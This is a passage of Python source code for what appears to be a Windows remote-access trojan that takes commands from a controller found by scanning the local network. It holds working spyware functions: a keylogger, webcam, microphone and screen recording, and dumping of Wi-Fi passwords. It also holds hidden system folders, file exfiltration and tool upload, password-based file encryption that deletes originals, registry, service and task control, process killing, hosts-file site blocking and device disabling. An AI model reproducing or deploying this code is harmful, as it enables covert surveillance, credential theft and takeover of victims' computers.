            imwrite(rf'{PATH}\file\E1C8-0936-66F4-4DD1-BE56-A0E1-5B1A-9023.png', webcam.read()[1])
            webcam.release()

            with open(rf'{PATH}\file\E1C8-0936-66F4-4DD1-BE56-A0E1-5B1A-9023.png', 'rb') as screenshot_webcam_png: 
                return screenshot_webcam_png.read()
    except: 
        return
    

def keylogger(mode=1):
    

    def get_keyboard_language():
        keyboard = WinDLL('user32', use_last_error=True)
        languages = {
            '0x409': 'en', '0x809': 'en', '0x0c09': 'en', '0x2809': 'en', '0x1009': 'en', '0x2409': 'en', 
            '0x3c09': 'en', '0x4009': 'en', '0x3809': 'en', '0x1809': 'en', '0x2009': 'en', '0x4409': 'en', 
            '0x1409': 'en', '0x3409': 'en', '0x4809': 'en', '0x1c09': 'en', '0x2c09': 'en', '0x3009': 'en', 
            '0x419': 'ru', '0x819': 'ru'
        }
        language_id = hex(keyboard.GetKeyboardLayout(
            keyboard.GetWindowThreadProcessId(
                keyboard.GetForegroundWindow(), 0)) & (2 ** 16 - 1)
        )
        
        if language_id in languages.keys(): 
            return languages[language_id]
        else: 
            return str(language_id)
        

    while True:
        try:
            with open(rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59', 'r') as module_status_file: 
                if module_status_file.read().strip() == '0':
                    return
        except: ...

        try: 
            if mode == 1: 
                module_report(rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59')  
        except: ...       

        try: 
            action = read_event()

            if action.event_type == 'down': 
                with open(rf'{PATH}\config\0A46-2C5D-67F8-DA81-CB53-EE16-7F79-4A7V', 'a', encoding='utf-8') as keylogger_requirement:
                    if 'windows' in action.name: 
                        keylogger_requirement.write('[WINDOWS]')
                    else:
                        match action.name.lower():
                            case (
                                'backspace' | 'enter' | 'space' | 'ctrl' | 'right ctrl' | 'shift' | 'right shift' | 'alt' | 'right alt' 
                                | 'tab' | 'caps lock' | 'up' | 'down' | 'left' | 'right' | 'insert' | 'home' | 'page up' | 'page down' 
                                | 'delete' | 'decimal' | 'end' | 'print screen' | 'scroll lock' | 'pause' | 'num lock' | 'clear' 
                                | 'esc' | 'f1' | 'f2' | 'f3' | 'f4' | 'f5' | 'f6' | 'f7' | 'f8' | 'f9' | 'f10' | 'f11' | 'f12'
                            ) as hotkey: 
                                if hotkey == 'enter':
                                    keylogger_requirement.write('\n')
                                elif hotkey == 'space':
                                    keylogger_requirement.write(' ')
                                else: 
                                    keylogger_requirement.write(f'[{hotkey.upper()}]')
                            case _:
                                try: 
                                    language = windows_locale[windll.kernel32.GetUserDefaultUILanguage()].split('_')[0].lower()
                                except: 
                                    language = 'NOT FOUND'   

                                if get_keyboard_language() == 'en':  
                                    if language == 'en': 
                                        keylogger_requirement.write(action.name)   
                                    else: 
                                        for char_id in {
                                            1092: 97, 1080: 98, 1089: 99, 1074: 100, 1091: 101, 
                                            1072: 102, 1087: 103, 1088: 104, 1096: 105, 1086: 106, 
                                            1083: 107, 1076: 108, 1100: 109, 1090: 110, 1097: 111, 
                                            1079: 112, 1081: 113, 1082: 114, 1099: 115, 1077: 116, 
                                            1075: 117, 1084: 118, 1094: 119, 1095: 120, 1085: 121, 
                                            1103: 122, 1060: 65, 1048: 66, 1057: 67, 1042: 68, 1059: 69,
                                            1040: 70, 1055: 71, 1056: 72, 1064: 73, 1054: 74, 1051: 75, 
                                            1044: 76, 1068: 77, 1058: 78, 1065: 79, 1047: 80, 1049: 81, 
                                            1050: 82, 1067: 83, 1045: 84, 1043: 85, 1052: 86, 1062: 87, 
                                            1063: 88, 1053: 89, 1071: 90, 1105: 96, 1025: 126, 34: 64, 
                                            8470: 35, 59: 36, 58: 94, 63: 38, 1041: 60, 1073: 44, 
                                            1102: 46, 1070: 62, 44: 63, 47: 124, 1093: 91, 1061: 123, 
                                            1066: 125, 1098: 93, 1078: 59, 1046: 58, 1101: 39, 1069: 34
                                        }.items():
                                            if char_id[0] == ord(action.name): 
                                                keylogger_requirement.write(chr(char_id[1])) 
                                            elif char_id[0] == ord(action.name): 
                                                keylogger_requirement.write(chr(char_id[0]))
                                        else: 
                                            if action.name.isdigit(): 
                                                keylogger_requirement.write(action.name)    
                                else: 
                                    if language == 'ru' or language == 'uk': 
                                        keylogger_requirement.write(action.name)
                                    else:
                                        for char_id in {
                                            97: 1092, 98: 1080, 99: 1089, 100: 1074, 101: 1091, 102: 1072, 
                                            103: 1087, 104: 1088, 105: 1096, 106: 1086, 107: 1083, 108: 1076,
                                            109: 1100, 110: 1090, 111: 1097, 112: 1079, 113: 1081, 114: 1082, 
                                            115: 1099, 116: 1077, 117: 1075, 118: 1084, 119: 1094, 120: 1095, 
                                            121: 1085, 122: 1103, 65: 1060, 66: 1048, 67: 1057, 68: 1042, 69: 1059, 
                                            70: 1040, 71: 1055, 72: 1056, 73: 1064, 74: 1054, 75: 1051, 76: 1044, 
                                            77: 1068, 78: 1058, 79: 1065, 80: 1047, 81: 1049, 82: 1050, 83: 1067, 
                                            84: 1045, 85: 1043, 86: 1052, 87: 1062, 88: 1063, 89: 1053, 90: 1071, 
                                            96: 1105, 126: 1025, 64: 34, 35: 8470, 36: 59, 94: 58, 38: 63, 
                                            60: 1041, 44: 1073, 46: 1102, 62: 1070, 63: 44, 124: 47, 91: 1093, 
                                            123: 1061, 125: 1066, 93: 1098, 59: 1078, 58: 1046, 39: 1101, 34: 1069
                                        }.items():
                                            if char_id[0] == ord(action.name): 
                                                keylogger_requirement.write(chr(char_id[1])) 
                                            elif char_id[0] == ord(action.name): 
                                                keylogger_requirement.write(chr(char_id[0]))  
                                        else: 
                                            if action.name.isdigit(): 
                                                keylogger_requirement.write(action.name) 
        except: 
            continue


def play(second, mode):
    match mode:
        case 0:
            audio = PyAudio()
            stream = audio.open(format=paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            frames = []

            for _ in range(44100 // 1024 * second): 
                frames.append(stream.read(1024, exception_on_overflow=False))

            stream.stop_stream()
            stream.close()
            audio.terminate()

            with open_audio(rf'{PATH}\file\V7FB-FAAE-A543-42CE-AF39-CFAC8-449-EE1E.mp3', 'wb') as sound_mp3: 
                sound_mp3.setnchannels(1)
                sound_mp3.setsampwidth(audio.get_sample_size(paInt16))
                sound_mp3.setframerate(44100)
                sound_mp3.writeframesraw(b''.join(frames))
        case 1:
            video = VideoWriter(rf'{PATH}\file\49AD-4DD3-22FF-170E-F83E-21AF-4EEB-92B5.mp4', 
                                VideoWriter_fourcc(*'mp4v'), 10, (pygui.size()))
            
            for _ in range(second * 10):
                try: 
                    video.write(cvtColor(array(pygui.screenshot()), COLOR_BGR2RGB))
                except: 
                    break

            video.release() 
        case _:
            webcam = VideoCapture(0)

            if not webcam.isOpened(): 
                webcam = VideoCapture(1)

            if webcam.isOpened():
                webcam.set(CAP_PROP_FPS, 20)
                webcam.set(CAP_PROP_FRAME_WIDTH, 1280)
                webcam.set(CAP_PROP_FRAME_HEIGHT, 720)

                video = VideoWriter(rf'{PATH}\file\2328-6639-9EAA-AB39-D099-56B2-9C94-EFEF.mp4', 
                    VideoWriter_fourcc(*'mp4v'), 20, (1280, 720))
                
                for _ in range(second * 20): 
                    video.write(webcam.read()[1])

                video.release()
                webcam.release()
            else: 
                raise OSError('[Errno -9999] Unanticipated host error')  


def get_my_ip_address():


    def get_ip():
        _ip = search(r'IPv4.+[:]\s(\d+[.]\d+[.]\d+[.]\d+)', cmd(run('ipconfig', 
            stdout=PIPE, stderr=DEVNULL, shell=True).stdout)).group(1)
        
        return _ip


    ip = gethostbyname(gethostname())

    try: 
        ip_address(ip)
    except: 
        ip = get_ip()
    else:
        if ip == '127.0.0.1': 
            ip = get_ip()
            
    return ip


def search_server():
    global my_ip_address

    if not MY_IP_ADDRESS:
        my_ip_address = get_my_ip_address()
    else:
        my_ip_address = MY_IP_ADDRESS

    my_ip_mask = ip_network(f'{my_ip_address[:my_ip_address.rindex(".")]}.0/24').hosts()

    while True:
        for ip_address_for_session in my_ip_mask:
            try:
                if SERVER_IP_ADDRESS:
                    ip_server = SERVER_IP_ADDRESS
                else:
                    ip_server = ip_address_for_session

                with create_connection((str(ip_server), 49_050), timeout=0.3) as connection_to_server: 
                    return str(ip_server)
            except:
                continue


def create_session():
    global useragent


    def create_directories():
        for folder_path in [
                PATH, 
                f'{PATH}\\config', 
                f'{PATH}\\config\\sessions', 
                f'{PATH}\\file', 
                f'{PATH}\\tools', 
                f'{PATH}\\devices'
            ]:
            try:
                if not exists(folder_path): 
                    mkdir(folder_path) 
                    run(f'attrib +h +s +r {folder_path}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
            except: 
                continue 


    def password_check(session):
        nonlocal connection_counter

        send_msg(session, getlogin())

        while True:
            if not receive_msg(session) == '__SESSION__PASSWORD__':
                raise ConnectionRefusedError

            match receive_msg(session):
                case 'exit': 
                    connection_counter = 50
                    
                    raise StopIteration
                case 'empty' | 'ctrl_c' | 'Password is incorrect' | 'clear':
                    continue
                case _ as server_password: 
                    if server_password == PASSWORD:
                        send_msg(session, 'Session login completed')
                        create_account(
                            server_data['session_state'], 
                            server_data['node'], 
                            server_data['host'], 
                            server_data['port'], 
                            server_data['platform'], 
                            server_data['connection_date']
                        )
                        
                        return
                    else: 
                        send_msg(session, f'Password not found --> {server_password}')


    def create_account(_session_state, _node, _host, _port, _platform, _connection_date):
        with open(rf'{PATH}\config\sessions\{int(ip_address(_host))}', 'w') as server_data_file: 
            server_data_file.write(encrypt_string(
                f'Session state: {_session_state}\n' + 
                f'Node: {_node}\n' + 
                f'Host: {_host}:{_port}\n' + 
                f'Platform: {_platform}\n' +
                f'Connection date: {_connection_date}')
            )


    def session_closed():
        create_account(
            'off', 
            server_data['node'], 
            server_data['host'], 
            server_data['port'], 
            server_data['platform'], 
            server_data['connection_date']
        )
    

    server_ip_address = search_server()
    connection_counter = 0

    try: 
        _node = node()
    except: 
        _node = 'NOT FOUND'

    try: 
        _platform = system() 
    except:
        _platform = 'NOT FOUND'

    try: 
        _release = release()
    except: 
        _release = 'NOT FOUND'

    try: 
        _edition = win32_edition()
    except: 
        _edition = 'NOT FOUND'

    try: 
        screen_resolution = f'{(resolution := pygui.size()).width}x{resolution.height}'
    except: 
        screen_resolution = 'NOT FOUND'
    
    while True:
        try:   
            with create_connection((server_ip_address, 49_050), timeout=60) as session:
                session_date = get_date()

                if receive_msg(session) == '__DATE__':
                    send_msg(session, f'{session_date[0]} | {session_date[-1]}')

                sleep(0.5)

                if receive_msg(session) == '__PLATFORM__':
                    send_msg(session, f'{_platform} {_release} {_edition}')
                
                match receive_msg(session):
                    case '__CONTINUE__' | '__RESTART__': 
                        continue 
                    case _: 
                        create_directories()

                        server_data = loads(session.recv(1_000_000_000))
                        server_data = {
                            'session_state': decrypt_string(server_data['session_state']), 
                            'node': decrypt_string(server_data['node']), 
                            'host': decrypt_string(server_data['host']), 
                            'port': decrypt_string(server_data['port']), 
                            'platform': decrypt_string(server_data['platform']), 
                            'connection_date': decrypt_string(server_data['connection_date'])
                        }

                        if receive_msg(session) != '__REGISTER__':
                            continue

                        if not exists(rf'{PATH}\config\sessions\{int(ip_address(server_data["host"]))}'): 
                            send_msg(session, '__START_REGISTRATION__')
                            sleep(0.5)
                            password_check(session)
                            continue
                        else: 
                            sleep(0.5) 
                            send_msg(session, '__SERVER_REGISTERED__')
                            create_account(
                                server_data['session_state'], 
                                server_data['node'], 
                                server_data['host'], 
                                server_data['port'], 
                                server_data['platform'], 
                                server_data['connection_date']
                            )

                            session.sendall(dumps({
                                'host': encrypt_string(my_ip_address), 
                                'port': encrypt_string(server_data['port']), 
                                'node': encrypt_string(_node), 
                                'user': encrypt_string(getlogin()), 
                                'platform': encrypt_string(f'{_platform} {_release} {_edition}'), 
                                'screen_resolution': encrypt_string(screen_resolution), 
                                'connection_date': encrypt_string(f'{session_date[0]} | {session_date[-1]}')})
                            )

                            while True:      
                                try: 
                                    create_directories()
                                    receiver(session, receive_msg(session).strip())
                                except StopIteration:
                                    connection_counter = 50

                                    if exists(rf'{PATH}\config\sessions\{int(ip_address(server_data["host"]))}'):
                                        session_closed()

                                    break
                                except ConnectionError: 
                                    if exists(rf'{PATH}\config\sessions\{int(ip_address(server_data["host"]))}'): 
                                        session_closed()

                                    break  
                                except: 
                                    continue
        except: 
            connection_counter += 1

            if connection_counter >= 50:
                server_ip_address = search_server()
                connection_counter = 0


def receiver(session, command):


    def cmd_tool(cmd_command, error):
        result_cmd = run(cmd_command.split(), stdout=PIPE, stderr=PIPE, input=False, shell=True)

        if not (stdout := cmd(result_cmd.stdout)): 
            stdout = error

        if not (stderr := cmd(result_cmd.stderr)): 
            stderr = error

        send_msg(session, stdout.strip() if stdout else stderr.strip()) 
    

    try:
        try:
            cd_path = search(r'^cd (\S?.+)', command).group(1).strip()
            chdir(cd_path)
            send_msg(session, 'completed')
       
            return
        except AttributeError: ... 

        try:   
            hide_path = search(r'^hide (\S?.+)', command).group(1).strip()
    
            if exists(hide_path): 
                run(f'attrib +h +s +r "{hide_path}"', stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, 'completed')
            else: 
                raise FileNotFoundError(f'[WinError 2] The specified file was not found: \'{hide_path}\'')
       
            return
        except AttributeError: ...

        try: 
            unhide_path = search(r'^unhide (\S?.+)', command).group(1).strip()

            if exists(unhide_path): 
                run(f'attrib -h -s -r "{unhide_path}"', stdout=DEVNULL, stderr=DEVNULL, shell=True)
                send_msg(session, 'completed')
            else:
                raise FileNotFoundError(f'[WinError 2] The specified file was not found: \'{unhide_path}\'')           
       
            return
        except AttributeError: ...

        try:
            mkdir_path = search(r'^mkdir (\S?.+)', command).group(1).strip()
            mkdir(mkdir_path)
            send_msg(session, 'completed')
      
            return
        except AttributeError: ...

        try:
            mkfile_path = search(r'^mkfile (?P<path>\S?.+) -c (?P<content>\S?.+)', command).groupdict()

            with open(mkfile_path['path'].strip(), 'w') as mkfile_file: 
                mkfile_file.write(sub(r'(\\n)', '\n', sub(r'(\\t)', '\t', mkfile_path['content'].strip())))
            
            send_msg(session, 'completed')
      
            return
        except AttributeError: ...

        try:
            rn_path = search(r'^rn (?P<path>\S?.+) -t (?P<new_name>\S?.+)', command).groupdict()
            rename(rn_path['path'].strip(), abspath(rn_path['new_name'].strip()))
            send_msg(session, 'completed')
       
            return
        except AttributeError: ...

        try:
            rmdir_path = search(r'^rmdir (\S?.+)', command).group(1).strip()
            delete_directory(rmdir_path, mode=1)
            send_msg(session, 'completed')
      
            return
        except AttributeError: ...

        try:
            rm_path = search(r'^rm (\S?.+)', command).group(1).strip()

            if not isfile(rm_path): 
                raise FileNotFoundError(f'[WinError 2] The specified file was not found: \'{rm_path}\'')
            
            del_file(rm_path)        
            send_msg(session, 'completed')

            return
        except AttributeError: ...

        try:
            cp_path = search(r'^cp (?P<path_from>\S?.+) -t (?P<path_to>\S?.+)', command).groupdict()

            if not isfile(cp_path['path_from'].strip()):
                copytree(cp_path['path_from'].strip(), cp_path['path_to'].strip(), dirs_exist_ok=True) 
            else:
                copy_path(cp_path['path_from'].strip(), cp_path['path_to'].strip())
            
            send_msg(session, 'completed')
      
            return
        except AttributeError: ...

        try:
            mv_path = search(r'^mv (?P<path_from>\S?.+) -t (?P<path_to>\S?.+)', command).groupdict()
            move_path(mv_path['path_from'].strip(), mv_path['path_to'].strip())
            send_msg(session, 'completed')   

            return
        except AttributeError: ...

        try:
            download_path = search(r'^download (\S?.+)', command).group(1).strip()

            with open(download_path, 'rb') as download_file: 
                session.sendall(download_file.read())

            return
        except AttributeError: ...

        try:
            upload_path = search(r'^upload (\S?.+) in folder tools', command).group(1).strip()
                    
            with open(f'{PATH}\\tools\\{upload_path}', 'wb') as upload_file: 
                upload_file.write(receive_msg(session, flag=True))   
                    
            send_msg(session, f'Uploaded file was saved to this path {PATH}\\tools\\{upload_path} [+]')        
            
            return
        except AttributeError: ...

        try:
            encrypt_file = search(r'^encrypt (?P<path>\S?.+) -p (?P<password>\S?.+)', command).groupdict()
            encryptFile(encrypt_file['path'].strip(), f'{encrypt_file["path"].strip()}.cw', encrypt_file['password'].strip())
            remove(encrypt_file['path'].strip())
            replace(f'{encrypt_file["path"].strip()}.cw', encrypt_file['path'].strip())
            send_msg(session, 'completed')   

            return
        except AttributeError: ...

        try:
            decrypt_file = search(r'^decrypt (?P<path>\S?.+) -p (?P<password>\S?.+)', command).groupdict()
            decryptFile(decrypt_file['path'].strip(), f'{decrypt_file["path"].strip()}.cw', decrypt_file['password'].strip())
            remove(decrypt_file['path'].strip())
            replace(f'{decrypt_file["path"].strip()}.cw', decrypt_file['path'].strip())
            send_msg(session, 'completed')

            return
        except AttributeError: ...

        try:
            netsh = search(r'^netsh (\S?.+)', command).group(1).strip()
            cmd_tool(f'netsh {netsh}', f'The {netsh} command was not found.')

            return
        except AttributeError: ...

        try:
            network = search(r'^network (-s|-p|-c|-d)', command).group(1).strip()

            match network:
                case '-s': 
                    send_msg(session, wifi()) 
                case '-p': 
                    if wifi_password := get_wifi_password():
                        send_msg(session, tabulate(wifi_password, headers=[('SSID'), ('PASSWORD')], tablefmt='pipe'))
                    else:
                        send_msg(session, 'NOT FOUND')
                case '-c': 
                    run('ipconfig /renew'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                    send_msg(session, 'completed') 
                case _: 
                    run('ipconfig /release'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
                    send_msg(session, 'completed') 
       
            return
        except AttributeError: ...

        try:        
            kill_app = search(r'^kill (-p|-n) (\d+|\S?.+)', command).group(1, 2)
 
            if kill_app[0].strip() == '-p':
                run(f'taskkill /f /PID {kill_app[1].strip()}'.split(), 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True) 
            else:
                run(f'taskkill /f /IM {kill_app[1].strip()}'.split(), 
                    stdout=DEVNULL, stderr=DEVNULL, shell=True) 
                
            send_msg(session, 'completed') 
           
            return
        except AttributeError: ... 

        try: 
            reg = search(r'^reg (\S?.+)', command).group(1).strip()
            cmd_tool(f'reg {reg}', f'Error. Invalid argument or parameter \'{reg}\'.\nEnter "REG /?" for information on use.')   

            return
        except AttributeError: ...

        try:
            sc = search(r'^sc (\S?.+)', command).group(1).strip()
            cmd_tool(f'sc {sc}', 'The specified service is not installed.') 

            return
        except AttributeError: ... 

        try:
            schtasks = search(r'^schtasks (\S?.+)', command).group(1).strip()
            cmd_tool(f'schtasks {schtasks}',
                f'ERROR: Invalid parameter or argument - \'{schtasks}\'.\nEnter "SCHTASKS/QUERY/?" for information on use')

            return
        except AttributeError: ...

        try:
            secedit = search(r'^secedit (\S?.+)', command).group(1).strip()
            cmd_tool(f'secedit {secedit}', 'For all filenames, this is the actual directory unless a different path is specified.')   

            return
        except AttributeError: ...

        try:
            wmic = search(r'^wmic (\S?.+)', command).group(1).strip()
            cmd_tool(f'wmic {wmic}', f'{wmic} - alias not found.') 
     
            return
        except AttributeError: ...

        try:
            winmgmt = search(r'^winmgmt (\S?.+)', command).group(1).strip()
            cmd_tool(f'winmgmt {winmgmt}', 'Invalid parameter')  
   
            return
        except AttributeError: ...

        try:
            user = search(r'^user (\S?.+)', command).group(1).strip()

            if user == '/?': 
                send_msg(session, cmd(run('net USER /?'.split(), 
                    stdout=PIPE, stderr=PIPE, input=False, shell=True).stderr).strip())
            else: 
                if user == 'show':
                    cmd_tool('net USER', 'The command completed with one or more errors.') 
                else: 
                    cmd_tool(f'net USER {user}', 'The command completed with one or more errors.')

            return
        except AttributeError: ...

        try:
            _keylogger = search(r'^keylogger (-g|-r)', command).group(1).strip()

            if _keylogger == '-g':
                with open(rf'{PATH}\config\0A46-2C5D-67F8-DA81-CB53-EE16-7F79-4A7V', 'r', encoding='utf-8') as keylogger_requirement: 
                    if collected_keylogger_data := keylogger_requirement.read():
                        send_msg(session, collected_keylogger_data) 
                    else: 
                        send_msg(session, 'Keylogger data is empty')
            else: 
                with open(rf'{PATH}\config\0A46-2C5D-67F8-DA81-CB53-EE16-7F79-4A7V', 'w', encoding='utf-8') as keylogger_requirement: ... 
                
                send_msg(session, 'completed')  

            return
        except AttributeError: ...

        try: 
            show_message = search(r'^show (?P<type>-p|-i|-w|-e) (?P<title>\S?.+) -t (?P<text>\S?.+)', command).groupdict()
            message_content = sub(r'(\\n)', '\n', sub(r'(\\t)', '\t', show_message['text'].strip()))
                    
            match show_message['type'].strip():
                case '-p': 
                    Notification(show_message['title'].strip(), message_content, duration='long').show()  
                case '-i': 
                    showinfo(show_message['title'].strip(), message_content)          
                case '-w': 
                    showwarning(show_message['title'].strip(), message_content)      
                case _: 
                    showerror(show_message['title'].strip(), message_content) 

            send_msg(session, 'completed')    
                
            return
        except AttributeError: ...

        if 'module' in command:
            try:
                _module = search(r'^module (?P<mode>-e|-d) (?P<name>all|agent|keylogger|app)', command).groupdict()
                
                match _module['name'].strip():
                    case 'all': 
                        setup_module(
                            agent, 
                            'agent', 
                            rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61', 
                            _module['mode'].strip()
                        )
                        setup_module(
                            keylogger, 
                            'keylogger', 
                            rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59', 
                            _module['mode'].strip()
                        )
                        setup_module(
                            block_app, 
                            'app', 
                            rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919', 
                            _module['mode'].strip()
                        )
                    case 'agent': 
                        setup_module(
                            agent, 
                            'agent', 
                            rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61', 
                            _module['mode'].strip()
                        )
                    case 'keylogger': 
                        setup_module(
                            keylogger, 
                            'keylogger', 
                            rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59', 
                            _module['mode'].strip()
                        )
                    case _: 
                        setup_module(
                            block_app, 
                            'app', 
                            rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919', 
                            _module['mode'].strip()
                        )
                
                send_msg(session, 'completed')
 
                return
            except AttributeError: ... 

            try:
                search(r'^module (-g)', command).group(1).strip() 
                send_msg(
                    session, 
                    tabulate((
                            status_module(
                                'agent', 
                                rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61'
                            ),
                            status_module(
                                'keylogger',
                                rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59'
                            ), 
                            status_module(
                                'app', 
                                rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919')
                    ), 
                        headers=[('MODULE'), ('STATE')], 
                        tablefmt='grid')
                )

                return
            except AttributeError: ...

        elif 'accounts' in command:
            try:
                search(r'^accounts (-g)', command).group(1).strip() 
        
                accounts = []

                for account_file in glob(rf'{PATH}\config\sessions\*'):
                    try: 
                        with open(account_file, 'r') as account_data_file: 
                            accounts.append(decrypt_string(account_data_file.read()))
                    except: 
                        continue

                send_msg(session, tabulate([accounts], tablefmt='grid'))

                return
            except AttributeError: ...

            try: 
                account_id = search(r'^accounts -d (\S?.+)', command).group(1).strip() 
                remove(rf'{PATH}\config\sessions\{int(ip_address(account_id))}')

                if not exists(rf'{PATH}\config\sessions\{int(ip_address(account_id))}'):
                    send_msg(session, f'Account has been deleted {account_id} [-]')
                else:
                    send_msg(session, f'Account has not been deleted {account_id} [-]')

                return
            except AttributeError: ...

        elif 'site' in command:
            try:
                site_url_open = search(r'^site -s (\S?.+)', command).group(1).strip()
                open_website(site_url_open)
                send_msg(session, f'Open {site_url_open} [+]') 
                   
                return
            except AttributeError: ... 

            try:
                site_block = search(r'^site (-b|-d) (\S?.+)', command).group(1, 2)
                    
                if site_block[0].strip() == '-b':
                    block_site(name=site_block[-1].strip())
                    send_msg(session, f'Site has been added to blocked list {site_block[-1].strip()} [+]')
                else: 
                    block_site(delete_name=site_block[-1].strip())
                    send_msg(session, f'Site has been removed from blocked list {site_block[-1].strip()} [-]') 

                return
            except AttributeError: ...

            try:
                sites_blocked = search(r'^site (-l|-r)', command).group(1).strip()
                   
                if sites_blocked == '-l':
                    sites_blocked = []

                    with open(r'C:\Windows\System32\drivers\etc\hosts', 'r', encoding='utf-8') as hosts:
                        for _site_blocked in hosts.read().split('\n'):
                            try: 
                                if (site_blocked := _site_blocked.split())[0] == '127.0.0.1' and not site_blocked[1] in DOMAINS:
                                    sites_blocked.append((' '.join(site_blocked[3:]), site_blocked[1]))
                            except: 
                                continue

                    if not sites_blocked:
                        send_msg(session, 'No blocked websites') 
                    else:
                        send_msg(session, tabulate(sites_blocked, headers=[('DATE'), ('DOMAIN')], tablefmt='pipe'))  
                else: 
                    block_site(restart=True)
                            
                return
            except AttributeError: ...
            
        elif 'device' in command:
            try:
                device_mode = search(r'^device (-c|-r|-g|-l|-f|-s)', command).group(1).strip()
     
                match device_mode:
                    case '-c': 
                        device(mode=0)     
                    case '-r': 
                        device(mode=1)
                    case '-g': 
                        device(session=session, mode=3)
                    case '-l':
                        with open(rf'{PATH}\devices\__LOG__.bin', 'w', encoding='utf-8') as log_bin: ...
                    case '-f':      
                        command_device = {}

                        for _command_device in command.split(','):
                            if 'node=' in _command_device: 
                                command_device['node'] = _command_device.split('=')[-1]
                            elif 'platform=' in _command_device: 
                                command_device['platform'] = _command_device.split('=')[-1]
                            elif 'platform_version=' in _command_device:
                                command_device['platform_version'] = _command_device.split('=')[-1]
                            elif 'platform_edition=' in _command_device: 
                                command_device['platform_edition'] = _command_device.split('=')[-1]
                            elif 'product_code=' in _command_device: 
                                command_device['product_code'] = _command_device.split('=')[-1]
                            elif 'motherboard_name=' in _command_device: 
                                command_device['motherboard_name'] = _command_device.split('=')[-1]
                            elif 'motherboard_id=' in _command_device: 
                                command_device['motherboard_id'] = _command_device.split('=')[-1] 
                            elif 'bios_name=' in _command_device: 
                                command_device['bios_name'] = _command_device.split('=')[-1] 
                            elif 'bios_version=' in _command_device: 
                                command_device['bios_version'] = _command_device.split('=')[-1] 
                            elif 'bios_date=' in _command_device: 
                                command_device['bios_date'] = _command_device.split('=')[-1] 
                            elif 'cpu=' in _command_device: 
                                command_device['cpu'] = _command_device.split('=')[-1] 
                            elif 'cpu_name=' in _command_device: 
                                command_device['cpu_name'] = _command_device.split('=')[-1] 
                            elif 'cpu_id=' in _command_device: 
                                command_device['cpu_id'] = _command_device.split('=')[-1] 
                            elif 'video_card=' in _command_device: 
                                command_device['video_card'] = _command_device.split('=')[-1] 
                            elif 'disk=' in _command_device: 
                                command_device['disk'] = _command_device.split('=')[-1] 
                            elif 'monitor=' in _command_device: 
                                command_device['monitor'] = _command_device.split('=')[-1] 
                            elif 'sound_device=' in _command_device: 
                                command_device['sound_device'] = _command_device.split('=')[-1] 
                            elif 'network_adapter=' in _command_device: 
                                command_device['network_adapter'] = _command_device.split('=')[-1] 
                        
                        device(
                            computer_name=command_device.get('node'), 
                            computer_platform=command_device.get('platform'), 
                            computer_version=command_device.get('platform_version'), 
                            computer_edition=command_device.get('platform_edition'), 
                            computer_product_code=command_device.get('product_code'), 
                            motherboard_name=command_device.get('motherboard_name'),
                            motherboard_product=command_device.get('motherboard_id'), 
                            bios_name=command_device.get('bios_name'), 
                            bios_version=command_device.get('bios_version'),
                            bios_date=command_device.get('bios_date'), 
                            cpu=command_device.get('cpu'), 
                            cpu_name=command_device.get('cpu_name'), 
                            cpu_id=command_device.get('cpu_id'), 
                            video_card=command_device.get('video_card'), 
                            disk=command_device.get('disk'), 
                            monitor=command_device.get('monitor'), 
                            sound_device=command_device.get('sound_device'), 
                            network_adapter=command_device.get('network_adapter'), 
                            mode=2
                        )
                    case _:
                        for _command_device_status in command.split(','):
                            if 'disk=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    evice_id='DISK', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'video_card=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='VIDEOCARD', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'monitor=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='MONITOR', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'sound_device=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='SOUNDDEVICE', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'mouse=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='USB', 
                                    usb='MOUSE_ENABLE' if _command_device_status.split('=')[-1] == 'enable' else 'MOUSE_DISABLE', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'keyboard=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='USB', 
                                    usb='KEYBOARD_ENABLE' if _command_device_status.split('=')[-1] == 'enable' else 'KEYBOARD_DISABLE', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'ethernet=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='USB', 
                                    usb='ETHERNET_ENABLE' if _command_device_status.split('=')[-1] == 'enable' else 'ETHERNET_DISABLE', 
                                    device_status=_command_device_status.split('=')[-1], 
                                    mode=4
                                )
                            elif 'wlan=' in _command_device_status and (
                            'enable' in _command_device_status or 'disable' in _command_device_status): 
                                device(
                                    device_id='USB', 
                                    usb='WLAN_ENABLE' if _command_device_status.split('=')[-1] == 'enable' else 'WLAN_DISABLE', 
